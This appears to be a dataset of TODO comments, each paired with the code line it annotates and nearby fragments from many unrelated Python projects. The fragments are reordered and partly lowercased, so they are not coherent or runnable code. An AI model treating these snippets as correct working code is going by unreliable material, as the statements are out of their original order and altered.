# todo(t2r_contributors): switch to using gin config for all saver params. </s> keep_checkpoint_every_n_hours = none	model_fn scaffold = scaffold_fn() if not tf.get_collection(tf.GraphKeys.SAVERS): max_to_keep = None if config is not None:
# todo(cmaloney): switch to a sane http server </s> def wsgi_app(env, start_response):	wsgi_app subscriber.handle_event(json.load(env['wsgi.input'])) start_response('200 OK', [('Content-Type', 'text/html')])
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> response_options = { 'norefresh' : true }	test_happy_path @httpretty.activate def test_happy_path(self): response = util.create_response(response_options) token_request = util.setup_expected_client_cred_token_request_response(200, response['wireResponse'])
# todo: test that valueerror is raised </s> validate.direction(direction)	_repertoire return self.effect_repertoire(mechanism, purview) else:
evaluation.message('setstreamposition', 'todo2', name)   #todo </s> return symbol('$failed')	apply_output seekpos = m.to_python() if not (isinstance(seekpos, int) and seekpos >= 0): if seekpos == 'Infinity': tmp = stream.seek(0, 2)
# todo(b/129148632): the current apache-beam 2.11.0 do not work with py3 </s> skip_beam_test = bool(six.py3)	test_download_prepare def test_download_prepare(self): if skip_beam_test: return
# todo: hand derive these results. </s> expected_algorithm_returns = {	test_daily_buy_and_hold algo.sources = list([trade_bar_data]) gen = algo._create_generator(sim_params) first_date: 0.0, second_date: -0.000350,
# todo: refactor </s> if mode is none:	DenseDesignMatrix def iterator(self, mode=None, batch_size=None, num_batches=None, topo=None, targets=None, rng=None): if hasattr(self, '_iter_subset_class'): mode = self._iter_subset_class
# todo: ensure it's up to date </s> return self._view_change_counter	view_change_counter def view_change_counter(self): #bruce 080731
# todo: have the transform on this label be less hacky </s> label_group = object("g").append('"text"') \	build_js draw += xaxis_group if self.label: .add_attribute("text", '"%s"'%self.label) \ .attr('"x"', "width/2") \
# todo(jamalex): burn it all down! </s> if language == "pt-br":	get_content_data def get_content_data(request, content_id=None): language = request.language language = "pt" content_cache = get_content_cache(language=language)
# todo: pace ourselves (send through the uploader...) </s> for buf in changed_bufs:	initial_upload files.discard(buf['path']) self.send({'name': 'delete_buf', 'id': buf['id']}) files.discard(buf['path']) self.send({
# todo filter chamber in case person went between chambers same day? </s> role = person.get_role_at_date(vote_date, congress=vote.congress)	get_role_for @staticmethod def get_role_for(person, vote, vote_date): if role is not None: return role for role in person.roles.all():
# todo: handle `stream.close` and `stream.reset` </s> if peer_id not in self.handshaked_peers:	Node count: int, step: int) -> Tuple[BaseBeaconBlock, ...]: error_msg = f"not handshaked with peer={peer_id} yet" self.logger.info("Request beacon block failed: %s", error_msg)
# todo: perhaps something more self-documenting for variables names? </s> sid = 133	test_trade_feed_protocol def test_trade_feed_protocol(self): price = [10.0] * 4 volume = [100] * 4
# todo: support minp arg end_range etc. </s> minp = 1	roll_var_linear_generic add_obs, remove_obs, calc_out):  # pragma: no cover N = len(in_arr) output = np.empty(N, np.float64) start, end = _build_indexer(on_arr, N, win, False, True)
# todo: should this raise an exception if the script didn't finish? </s> if self.vba.memory[has_finished] == 0:	inject_asm self.call(script_address, bank=0) self.vba.step(count=1) return False elif self.vba.memory[has_finished] == 1:
# todo: get file name from user. </s> try:	_on_export def _on_export(self, menu_item): self.controller.export_project_file(filename=None) except Exception, exc:
# todo: must be implemented </s> pass	get_range_from_volumes def get_range_from_volumes(volumes, times=0):
# todo: replace and deprecate? </s> mr = self.mr_from_search(cls, query)	Manager return self.run_map_reduce(mr, map_handler) def riak_search_count(self, cls, query): mr = mr.reduce(function=["riak_kv_mapreduce", "reduce_count_inputs"]) return self.run_map_reduce(mr)
# todo: check lens </s> ma = s1.sum()	_column_corr_impl S2 = hpat.hiframes_api.to_series_type(B) n = S1.count() mb = S2.sum() a = n * ((S1*S2).sum()) - ma * mb
# todo: remove after implementing django-constance </s> if not dfirtrack_config.csv_skip_existing_system:	system return redirect(reverse('system_list')) else: messages.warning(request, 'WARNING: Existing systems will be updated!')
# todo i think this is a hack. it should be an </s> name = evaluator.wrap(name.parent).name	filter_names or str(name).startswith(like_name): if isinstance(name.parent, (tree.Function, tree.Class)): new = classes.Completion( evaluator,
# todo(obondarev): use neutron_lib constant </s> resource_extend.apply_funcs('ports_bulk', items, none)	get_ports page_reverse=page_reverse) items = [self._make_port_dict(c, fields, bulk=True) for c in query] if limit and page_reverse: items.reverse()
# todo find better documentation </s> self.struct = {	__init__ def __init__(self, ql): "Revision": 0x1.to_bytes(length=1, byteorder="little"),  # ADD "SubAuthorityCount": 0x1.to_bytes(length=1, byteorder="little"),
# todo: remove this - cura-4482 </s> material = self._global_container_stack.material	_onGlobalContainerChanged except TypeError: pass material.nameChanged.disconnect(self._onMaterialNameChanged) quality = self._global_container_stack.quality
# todo check </s> return self.mimetype.split('/')[-1]	encoding @interfacedoc def encoding(self):
raise notimplementederror #todo </s> elif q.kw(i,"format"):	parse while i < l: if q.kw(i,"RETURN"): raise NotImplementedError #TODO elif q.kw(i,"REQUEST"):
# todo: provide a kernel which will describe how coordinates are extruded. </s> mesh = firedrake.extrudedmesh(m, layers, layer_height=0.1)	integrate_assemble_p0 m = UnitSquareMesh(2 ** power, 2 ** power) layers = 11 fs = firedrake.FunctionSpace(mesh, family, degree, name="fs") f = firedrake.Function(fs)
# todo: python-2442 use _asdict() instead </s> options_dict = super(jsonoptions, self)._options_dict()	_options_dict def _options_dict(self): options_dict.update({ 'strict_number_long': self.strict_number_long,
# todo: maybe we should open this one to the users, as it lets them </s> self.filter.r *= 4.0	setup_filter dim_x, ) self.filter.Q[dim_z:, dim_z:] /= 10 else:
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: remove compatability hooks </s> if not exists(lockfile):	lock_version_dir else: lockfile = pathjoin(vdir,ESKY_CONTROL_DIR,"lockfile.txt") lockfile = pathjoin(vdir,"esky-lockfile.txt") f = open(lockfile,"r")
# todo: test this! </s> if self.settings.get('encrypt_home'):	configure_system except Exception as err: logging.warning(_("Unknown error in hardware module. Output: %s" % err)) self.queue_event('debug', _("Encrypting user home dir...")) encfs.setup(username, self.dest_dir)
# todo(dolph): remove this check after default-domain migration </s> if user_ref.get('domain_id') is not none:	validate_auth_info LOG.warning(msg) raise exception.Unauthorized(msg) user_domain_ref = self.identity_api.get_domain( context,
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.cpp", int i = 1;
# todo: make truly async </s> return discovery.build('cloudresourcemanager', 'v1', cache_discovery=false, cache=memorycache())	_build_client def _build_client(self):
# todo add checks for source space </s> _check_stc(stc1, stc2)	source_estimate_quantification Returns ------- score = _calc_metric(stc1.data, stc2.data, metric)
# todo(porg) not sure if created should ever throw... maybe warning/log? </s> c = x.created	to_note created: Optional[datetime] try: if c is not None and isinstance(c, date): created = None
# todo: move install_time away from app_setting </s> app_setting(app_id, 'install_time', now)	app_install now = int(time.time()) app_setting(app_id, 'id', app_id) status['installed_at'] = now if label:
#todo - check for or silence the expected warning? </s> continue	test_the_transcription str1 = str(example1) if len(str1) % 3 != 0: self.assertEqual(str1.replace("T","U").replace("t","u"), str(tran)) self.assertEqual(tran.alphabet, generic_rna)  # based on limited examples
# todo: 'ignore_status' could/should be removed when globalres.log is </s> ret = runcmd(timecmd, ignore_status=true, **kwargs)	time_cmd timecmd = ' '.join(timecmd) + ' ' timecmd += cmd timedata = tmpf.file.read() return ret, timedata
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	rescue def rescue(self, instance, callback, network_info):
# todo: it would be nice to be async about this. set 1 second timeout. </s> try:	dot_versioncheck 'version': bayeslite.__version__ } r = requests.post(SERVICE, data=payload, timeout=1) if r.status_code == 200 and r.json.result != "current":
# todo setup mahout, must be checked out from repo atm: </s> pass	install_mahout def install_mahout(env):
# todo change when v4 web3.py will released </s> dht_keys = tuple(self.escrow().getminerid(self.address, index).encode('latin-1') for index in range(count))	get_dht_key def get_dht_key(self) -> tuple: count = self.escrow().getMinerIdsCount(self.address) return dht_keys
# todo send the key to the master for approval </s> sh_ = '/bin/sh'	seed bs_ = gather_bootstrap_script() salt.crypt.gen_keys(mpt_tmp, 'minion', 2048) if os.path.isfile(os.path.join(mpt, 'bin/bash')): sh_ = '/bin/bash'
# todo: remove this when fixed in: https://github.com/seleniumhq/selenium/issues/767 </s> browser.service.process.send_signal(signal.sigterm)	fin def fin(): browser.close() browser.quit()
# todo: support multi-index columns </s> check_pie_plot(kdf1)	test_pie_plot kdf1 = self.kdf1
# todo private access.. </s> argument_iterator = field_tree_instance._arguments.unpack()	_infer_field if field_tree_instance.name.string_name == 'ForeignKey': if isinstance(field_tree_instance, TreeInstance): key, lazy_values = next(argument_iterator, (None, None)) if key is None and lazy_values is not None:
return 'ok' # todo should be a json or something </s> viewer.status = 'running_step'	step def step():
# todo: is write=true a reasonable way to do it? </s> except oserror as e:	add lgr.error("add: %s" % e) raise
# todo investigate different results between mac and linux/win platforms </s> retinfo.append("function: {:x} instruction: {:x} mapped mlil: {}".format(func.start, ins.address, str(ins.mapped_medium_level_il)))	test_low_il_instructions retinfo.append("Function: {:x} Instruction: {:x} LLIL->MLILS: {}".format(func.start, ins.address, str(sorted(list(map(str, ins.mlils)))))) retinfo.append("Function: {:x} Instruction: {:x} LLIL->HLIL: {}".format(func.start, ins.address, str(ins.hlil))) retinfo.append("Function: {:x} Instruction: {:x} Value: {}".format(func.start, ins.address, str(ins.value))) retinfo.append("Function: {:x} Instruction: {:x} Possible Values: {}".format(func.start, ins.address, str(ins.possible_values)))
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: invalidate cache for former latestappinfo </s> get_all_case_properties.clear(self)	ApplicationBase if not self._rev and not domain_has_apps(self.domain): domain_has_apps.clear(self.domain) get_usercase_properties.clear(self) get_app_languages.clear(self.domain)
# todo -- can we do this without a subscription? </s> if not api.use_store:	play_artist_radio @ask.intent("GeeMusicPlayArtistRadioIntent") def play_artist_radio(artist_name): return statement(render_template("not_supported_without_store")) if not api.use_store and api.is_indexing():
## todo delete me? </s> :type int	createPreview :param Resolution used for the render.
# todo replace with collections.sequence subclass </s> spotify.error.maybe_raise(self.error)	albums def albums(self): Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
# todo: reproduce and submit traceback to issue 41 </s> hosts = host.filter_by_fqdn(hostname)	_update def _update(hostname, ipaddr): ipaddr = str(ipaddr)  # bug in dnspython: crashes if ipaddr is unicode, wants a str! num_hosts = len(hosts) if num_hosts == 0:
# todo: refactor accordingly when v3 websocket api is released </s> output["results"].update({	BittrexAPIOrderBookDataSource if _is_snapshot(msg): output["results"] = _decode_message(msg["R"]) "M": f"{output['results']['M'].split('-')[1]}-{output['results']['M'].split('-')[0]}" })
# todo: remove requestor and integrate with wallet from gateway </s> return self.gateway.get_options()	get_options def get_options(self):
# todo is there a way to actually test that the creds work? </s> passed("verified pypi credentials")	check_pypi_creds try: token = os.environ['PYPI_TOKEN'] return token except Exception:
# todo: write me </s> raise notimplementederror('mbtiles cache does not yet implement the .remove() method.')	remove def remove(self, layer, coord, format):
"""todo: not implemented""" </s> notimplementederror("prs welcome")	percent_rank @symbolic_dispatch def percent_rank(x):
# todo: scalar, min is a workaround </s> return vals.min()	skew raise NotImplementedError("bias=False is not implemented.") if vals.ndim == 0: return vals
# todo: replace this with a report api </s> print "[visited] - %s"%newlink	handle_links link_failures.append(newlink) raise gen.Return() components = urlparse.urlparse(newlink) baseurl = components[0]+"://"+components[1]
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on else: polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo: parse text </s> if line[0] == '!':	parse_std_link if title: title = ESCAPE_CHAR.sub(r'\1', title) return self.renderer.image(link, text, title) return self.renderer.link(link, text, title)
# todo: remove when we stop supporting python < 3.5 </s> if sys.version_info.major < 3 or sys.version_info.minor < 5:	transform X_embedded : `numpy.ndarray`, shape=(n_samples, n_components) The embedded data points. check_is_fitted(self, ['preprocessor_', 'components_']) else:
# todo: test this </s> style = element.style	handle_computed_word_spacing def handle_computed_word_spacing(element): word-spacing: normal means zero. if get_value(style, 'word-spacing') == 'normal': style['word-spacing'] = PropertyValue('0')
# todo: remove this (ssh_user is a legacy arg) </s> user = _user_or_ssh_user(user, ssh_user)	upload + ssh_keyscan: execute ``ssh.keyscan`` before uploading the file remote_filename = remote_filename or filename connection_target = hostname if user:
# todo: process bind. </s> return binds	rebind myid = bundle.getid() binds = bindings.bind.find_by_id(myid)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_missing_transaction def test_missing_transaction(self): Unable to find the requested transaction.
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
# xxx todo </s> return address, size	input_address_range size    = None
# todo: add logger here </s> print(''.join('!! ' + line for line in lines))	make_screenshot exc_type, exc_value, exc_traceback = sys.exc_info() lines = traceback.format_exception(exc_type, exc_value, exc_traceback) browser.quit() return {"success": None, "error": True}
# todo: remove "get_" from the name </s> return the type of the node	get_node_type def get_node_type(self, node, index=False): Args: node: The node ID from the original graph
#todo: assuming constant mu </s> self._mfmui = self.mesh.getfaceinnerproduct(1/mu_0)	makeMassMatrices self._MeSigma = self.mesh.getEdgeInnerProduct(m) self._MeSigmaI = sdiag(1/self.MeSigma.diagonal())
# todo: need to update this so that it flushes bulk queue </s> print "need to implement this!"	flush_bulk self.es_connection.flush_bulk(True) else: raise NotImplementedError
# todo: remove deprected flags in 1.2 </s> self._deprecated_fit, self._deprecated_partial_fit = true, false	fit self Fitted estimator. return self._fit(X, partial=False)
# todo: add `coerce_float`, `params`, and 'parse_dates' parameters </s> def read_sql(sql, con, index_col=none, columns=none, **options):	read_sql Read SQL query or database table into a DataFrame. This function is a convenience wrapper around ``read_sql_table`` and
nullcontext = contextlib.exitstack()  # todo: use contextlib.nullcontext after python 3.7 </s> with lock or nullcontext:	write_result def write_result(input_data: bytes, output_data: Optional[bytes], *, input_path: pathlib.Path, output_path: pathlib.Path, print_data: bool, lock: Optional[threading.Lock] = None) -> None: if not input_path.parent.is_dir(): os.makedirs(str(input_path.parent), exist_ok=True)
# todo: rename this test </s> self.any_func_args('bad_input')	test_unrestrained_callable_arguments with self.assertRaises(RuntimeTypeError):
# todo: is there a benefit from differing bid and ask? </s> ticker_exchange_rate = (exchange.fetch_ticker(market_name)['ask'] + exchange.fetch_ticker(market_name)['bid']) / 2	initialize_completed_graph exchange.load_markets() for market_name, market_info in exchange.markets.items(): if ticker_exchange_rate == 0: continue
raise  # todo: what if our seed node fails verification? </s> temp_node_storage.forget()	from_seed_and_stake_info certificate_filepath=certificate_filepath) except potential_seed_node.InvalidNode: return potential_seed_node
# todo - do these in a single transaction? </s> self._set_register_bit(intcon, 0)	interrupt_on_change def interrupt_on_change(self): self.bank._check_read_mode_for_interrupts() self._set_register_bit(GPINTEN, 1)
# todo: explain these prior terms </s> ll_prior_a = -log_sigma_alpha**2 - dot(alpha, alpha) / (2*exp(log_sigma_alpha)**2) - n_features*log_sigma_alpha	log_likelihood W * B * LL_observed + W * (1 - B) * LL_censored, 0) LL_prior_b = -log_sigma_beta**2 - dot(beta, beta) / (2*exp(log_sigma_beta)**2) - n_features*log_sigma_beta LL = LL_prior_a + LL_prior_b + LL_data
pass # todo </s> else:	write_deserialize for field in spec.parsed_fields(): if field.is_array: if field.is_builtin: write_deserialize_builtin(s, field)
# todo error on too many levels </s> dashes = dict(zip(style_levels, self.default_dashes))	parse_style style_levels = categorical_order(data) if dashes is True: elif dashes and isinstance(dashes, dict): pass
# todo: "wildcards" other than <any> </s> if type == "<any>" or type == atype:	__directory_relations_by_arg_type continue for dummy, type in args: rels.append(r) return rels
# todo implement </s> ret = 1	hook_GetStringTypeExA }) def hook_GetStringTypeExA(ql, address, params): return ret
#todo todo todo todo todo todo todo todo todo </s> return pub_key	gen_RSA_key pub_key = crypto.PKey() pub_key.generate_key(crypto.TYPE_RSA, 1024)
entry['meta']['type'] = 'padding'  # todo handle padding, summarize and transfer </s> entry['flag']       = posting.flag	_journal_for_postings if isinstance(posting, Transaction): if posting.flag == 'P': entry['payee']      = posting.payee entry['narration']  = posting.narration
# todo: use madmom.utils.open </s> f = open(filename, 'wb')	save def save(self, filename): f.write('task %s\n' % self.task) f.write('autosave true\n')
# todo: this check may hide a bug a should be removed. </s> if not check_date:	is_expired if now > check_date + (seconds+minutes+hours) True is returned, else False return False total_hours = (day * 24) + hours
# todo: improve the unicode checking </s> try:	__setitem__ % (item, self._index_for.capitalize(), self._index_for)) value = urllib.quote_plus(value) except (KeyError, UnicodeEncodeError, UnicodeError):
# todo: fix </s> fn = [fn]	process_element d.array = True else: if e['name'] is not None and not alias: e_name = unicode(e['name'])
# todo: series support is not implemented yet. </s> return dataframe(internal)	applymap column_index=[c._internal.column_index[0] for c in applied])
# todo maybe a better function would do here </s> return sum(first_occ) / len(first_occ)	get_last_phrase_occurrence terms = phrase.split() first_occ = [self._get_last_term_occurrence(term) for term in terms]
# todo: remove temporary hack giving special status to "*" </s> if (trigger_text != none and trigger_text != "" and	search_anns_for_event except: Messager.error('Failed to retrieve trigger annotation %s, skipping event %s in search' % (e.trigger, e.id)) trigger_text != "*" and trigger_text not in t_ann.text): continue
# todo: bob crashes if he hasn't learned about this ursula #999 </s> ursula = self.known_nodes[node_id]	generate_work_orders capsules)) for node_id, arrangement_id in treasure_map_to_use: capsules_to_include = [] for capsule in capsules:
# todo: automate detection of max string length to set up numpy array accordingly </s> self.rangednames = np.zeros(shape = (int(self.app.activeworkbook.names.count),1), dtype=[('id', 'int_'), ('name', 's200'), ('formula', 's200')])	get_rangednames def get_rangednames(self): for i in range(0, self.app.ActiveWorkbook.Names.Count): self.rangednames[i]['id'] = int(i+1)
# todo: span_id= </s> raise args.usageerror('export: invalid variable name %r' % name)	Export for name in argv[i:]: if not match.IsValidVarName(name): mem.ClearFlag(name, var_flags_e.Exported, scope_e.Dynamic) else:
# todo pass this to json schema validation </s> for id_name in data:	put 'message': 'could not find movie with id %d in list %d' % (movie_id, list_id)}, 404 data = request.json if set(id_name.keys()) & set(MovieListBase().supported_ids) == set([]): return {'status': 'error',
# todo: name, exp_init, exp_end, exp_step, block </s> self.assertequal(15, p._pos)	testStatForStep self.assertIsNotNone(node)
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: with only non-mandatory model attributes, it is not possible to get an invalid form </s> else:   # coverage: ignore branch	system_exporter_spreadsheet_csv_config_view info_logger(str(request.user), " SYSTEM_EXPORTER_SPREADSHEET_CSV_CONFIG_CHANGED") return HttpResponse('<script type="text/javascript">window.close();</script>') return render( request,
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo: verify some output </s> cluster.marathon.destroy_app(test_app_id)	test_if_marathon_app_can_be_debugged logging.info('For %s call, got %s response: \n%s', lncs_data['type'], r.status_code, r.text) assert r.status_code == 200
# todo: uncomment when adding support for literal hex bytes </s> print(bytearray(b'hello world   ').islower())	test_islower print(bytearray(b'hello world').islower())
# todo: act </s> profiles = self.remote.get_profiles(self.token)	test_create_profile def test_create_profile(self): Test: create/edit a profile object profile = self.remote.new_profile(self.token) for field in self.profile_fields:
# todo log? </s> pass	wrap raise UnconsumedError(str(c)) else:
# todo: look this up in one query </s> for user_id in collaborator_ids:	get_collaborators_names_from_ids def get_collaborators_names_from_ids(collaborator_ids: List[int]): collaborators = [] user = db_user.get(user_id) if user:
# todo: remove when botfactory can force everything to be unthreaded </s> time.sleep(0.1)	test_isup_command_http_error irc.pm(user, '.isup example.com') while bot.running_triggers: assert len(bot.backend.message_sent) == 1, ( '.isup command should output exactly one line')
# todo: explicitly exploit symmetry and set onesided=true </s> h_fft = torch.rfft(h, signal_ndim=1, onesided=false)	forward_cwa r = self.relation_embeddings(batch[:, 1]) t = self.entity_embeddings.weight t_fft = torch.rfft(t, signal_ndim=1, onesided=False) h_fft[:, :, 1] *= -1
# todo: and netcdf writer will be more generic </s> su_descriptor = index_netcdfs([filename[7:]])[filename[7:]]	create_storage_unit except OSError: pass return StorageUnit([dataset.id for dataset in datasets], mapping,
# todo: the delay was a dirty hack. </s> if direction == -1:	Launchpad def LedCtrlString( self, string, red, green, direction = 0, waitms = 150 ): for i in string: for offsx in range(5,-8,-1):
# todo this dosn't work yet </s> e = indexerror(5).with_traceback(tb)	testWithTraceback e = BaseException().with_traceback(tb) self.assertIsInstance(e, BaseException) self.assertIsInstance(e, IndexError) class MyException(Exception):
# todo: add assertions </s> rasterplot(sim.trange(), sim.data[ap], use_eventplot=use_eventplot)	test_rasterplot sim.run(1.0)
# todo: just access the original event position, rather </s> p1 = np.array(event.last_event.pos)[:2]	PanZoomViewer event.handled = True elif 2 in event.buttons: p2 = np.array(event.pos)[:2] p1c = event.map_to_canvas(p1)[:2]
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_rectangle_draw @requires_scipy() def test_rectangle_draw(): raise SkipTest pos = np.array([[-0.1, 0.5, 0],
sil_ph = ["sil", "end"]  # todo fix hardcoded values </s> text = raw_text.split(" ")	ph_based_trim duration_path = config.get("duration_path", "dataset/durations") duration_fixed_path = config.get("duration_fixed_path", "dataset/trimmed-durations") trim_start, trim_end = False, False if text[0] in sil_ph:
# todo(ahundt) for multi-label try per class sigmoid top as follows: </s> return densenet.densenetfcn(input_shape=input_shape,	DenseNet_FCN include_top=False): if include_top is True: weights=None, classes=classes, nb_layers_per_block=[4, 5, 7, 10, 12, 15],
# todo: ensure it's up to date </s> return self._selection_change_counter	selection_change_counter def selection_change_counter(self): #bruce 080731
# todo extend to nonbinary nodes </s> return self.tpm.shape[-1]	size def size(self):
# todo: we're in need of more meta schema tests </s> def test_invalid_properties(self):	test_invalid_properties with self.assertRaises(SchemaError): validate({}, {"properties": {"test": True}})
# todo uncomment the actual test below after we have implemented the l1 attack </s> ord=1, **self.attack_param)	test_targeted_adv_example_success_rate_l1 NotImplementedError, self.help_targeted_adv_examples_success_rate,
'type': 'string', #todo: resolve </s> 'comment': ''	execute 'meta': [{ 'name': col[0] if type(col) is dict or type(col) is tuple else col, } for col in metadata] if has_result_set else [], 'type': 'table'
# todo: implement @plist </s> return 1	dotFromElement ============ None.
#todo(jogo) make admin=false work </s> creds = ('--os-username %s --os-tenant-name %s --os-password %s '	nova def nova(self, action, flags='', params='', admin=True, fail_ok=False): '--os-auth-url %s ' % (self.identity.admin_username, self.identity.admin_tenant_name, self.identity.admin_password,
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo what should the swissnum _actually_ be? </s> self._http_server = httpserver(self._storage_server, b"abcd")	setUp def setUp(self): self.storage_server = StorageServer(self.mktemp(), b"\x00" * 20) self.client = StorageClient( DecodedURL.from_text("http://example.com"),
# todo(brian): s/_container/container once other changes propogate </s> return self._create(_obj.object, **attrs)	create_object :returns: The results of object creation :rtype: :class:`~openstack.compute.v2.container.Container`
# todo: use regexps </s> if name[0] == '_' and not name[1] == '_':	__setattr__ def __setattr__(self, name, value): self.session_proxy[name] = value else:
# todo(lucasagomes): backward compatibility with :hexraw, </s> if conf.pxe.ipxe_enabled:	clean_up_pxe_config for mac in driver_utils.get_node_mac_addresses(task): utils.unlink_without_raise(_get_pxe_mac_path(mac)) utils.unlink_without_raise(_get_pxe_mac_path(mac, delimiter=''))
# todo -- can we do this without a subscription? </s> if not api.use_store:	play_latest_album_by_artist @ask.intent("GeeMusicPlayLatestAlbumIntent") def play_latest_album_by_artist(artist_name): return statement(render_template("not_supported_without_store")) api = GMusicWrapper.generate_api()
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: put an explanation here </s> raise valueerror()	__sub__ def __sub__(self, other): if self.center != other.center: selfp = getattr(self, 'positives', None) or (self,) selfn = getattr(self, 'negatives', ())
# todo: implement this </s> pass	_addPrintJobToQueue def _addPrintJobToQueue(self):
# todo : docker download </s> def docker_download(args):	docker_download @target_must_exist
# todo: put the formula in terms of conventions and give a vanilla example </s> explaining the same	mne def mne(predicted_power, df_appliances_ground_truth): Parameters ----------
# todo(brian): s/_container/container once other changes propogate </s> self._delete(_container.container, value, ignore_missing)	delete_container attempting to delete a nonexistent server. :returns: ``None``
# todo private access! </s> class_value=self.parent_context._value):	infer for c in apply_py__get__(result_value, instance=None, yield c else:
# todo: depreciated </s> ns.add_provider(provider)	import_model ns = self.namespace
# todo: workaround the fact that skiptest is not defined by unittest2.testcase </s> if splver[:2] < (6, 2):	setUp self.service = client.Service(**self.opts.kwargs) splver = self.service.splunk_version self.skipTest("Skipping cookie-auth tests, running in %d.%d.%d, this feature was added in 6.2+" % splver)
# todo test that this is called on next/prev/end-of-track </s> if self.current_track is none:	_trigger_stopped_playing_event def _trigger_stopped_playing_event(self): return for listener_ref in ActorRegistry.get_by_class(BackendListener):
# todo need to cache this </s> return module.pre(**kw)	pre_from_algorithm if k != 'cipher' and v is not None} module = importlib('nkms.crypto.block.' + algorithm['pre']['cipher'])
# todo exceptions don't seem to be using parent constructors at all. </s> self.code = code	__init__ def __init__(self, code, message): self.message = message
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	_impl return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods)
# todo also test these! </s> continue	test_classifiers_pickle continue if Clf in [MultinomialNB, BernoulliNB]: with warnings.catch_warnings(record=True): clf = Clf()
raise exceptions.mpdnotimplemented  # todo </s> this way.	rangeid everything". A song that is currently playing cannot be manipulated
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
# @todo: check permissions & avoid db updates in gets </s> db(s3db.req_req_item.id == request.vars.req_item_id).update(site_id = site_id)	req_controller site_id = inv_item.site_id item_id = inv_item.item_id response.confirmation = T("%(item)s requested from %(site)s") % \ {"item": s3db.supply_item_represent(item_id, show_link=False),
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: @sbharadwajj implement and test </s> return true	hessian_is_zero def hessian_is_zero(self):
#todo assert old_r.pubmed_id == new_r.pubmed_id </s> assert old_r.medline_id == new_r.medline_id	compare_references assert old_r.journal == new_r.journal
# todo: en passant. </s> san += square_names[move.to_square]	san san += FILE_NAMES[file_index(move.from_square)] san += "x" self.push(move) if self.is_check():
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as _send:	run def run(self): operation = getattr(self._client, self._operation_name) _send.return_value = mock.Mock( status_code=200, headers={}, content=b'{}')
# todo implement. </s> self.master_method = none	setup def setup(self): self.slave_method = None
# todo (#2743, see also #2556): make a portable constant or remove completely </s> sig_header = signature_to_follow	author if signer is not DO_NOT_SIGN: if sign_plaintext: signature = signer(plaintext) capsule, ciphertext = umbral.encrypt(recipient_key, sig_header + bytes(signature) + plaintext)
elif room_hosts:  # todo: shouldn't this be remote_room_host? </s> should_do_dance = true	_do_join if is_host_in_room: should_do_dance = False else: prev_state = yield self.store.get_room_member(
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
#todo this is wrong - need to add to biases only on no reuse </s> self.add_weights(alphas)	_frelu dtype=tf.float32) net = activation(_x) + alphas return tf.reshape(net, orig_shape)
# todo: calculate and write fingerprint </s> return numbers.public_key(default_backend())	generate_rsa_key ) self._put_data(key_slot.gen_time, struct.pack('>I', timestamp))
# todo: consider alternatives to using pillow here. </s> image_pil = image.open(image_path)	iterate self.errors += 1 continue width = image_pil.width height = image_pil.height
# todo: exception for coalesces that represents all sub_specs tried </s> raise coalesceerror('no valid values found while coalescing')	glom return spec.default else: elif isinstance(spec, Literal): return spec.value
# todo: store this data </s> s, h, g, d, comment = match.groups()	_parse_data_extension match = re.match(r'^DFS(\d)(\d)(\d)(\d)(.*)$', data) if match: errors.append('DFS parsing not implemented') return comment
# todo: investigate why this fails </s> pass	test_model_save def test_model_save(self):
# todo: allow configurable headers. </s> headers = {	write_file fp.write(content) mimetype = mimetypes.guess_type(path)[0] 'Cache-Control': 'no-cache', 'Content-Type': mimetype if mimetype else 'text/html',
# todo(yanase): check values </s> assert len(weights) == 2	test_calculate_with_prior consider_endpoints=consider_endpoints, weights_func=default_weights) assert len(mus) == 2 assert len(sigma) == 2
# todo skip this in the future </s> continue	download_cover_art if r.status_code == 200: if row["mime_type"] == "application/pdf": filename = "/tmp/release-colors.img" with open(filename, 'wb') as f:
# todo(hirofumi0810) fix this for after supporting transformer </s> subsampling_factor = model.subsample[0]	train model_class = dynamic_import(args.model_module) model = model_class(idim, odim, args, asr_model=asr_model, mt_model=mt_model) if asr_model is not None: del asr_model
# todo: add logging to indicate the failure </s> raw_conn.close()	Swarm ) except UpgradeFailure: return self.connections[peer_id] = muxed_conn
# todo: add location info for invalid backslash </s> s = ''.join(word_compile.evalcstringtoken(t.id, t.val)	EvalSingleQuoted s = ''.join(t.val for t in part.tokens) elif part.left.id == Id.Left_DollarSingleQuote: for t in part.tokens) else:
# todo action required that updates the endpoint </s> eps = []	clear_ignored def clear_ignored(self, args): device = args.rsplit(' ', 1)[0] if device == 'ignored':
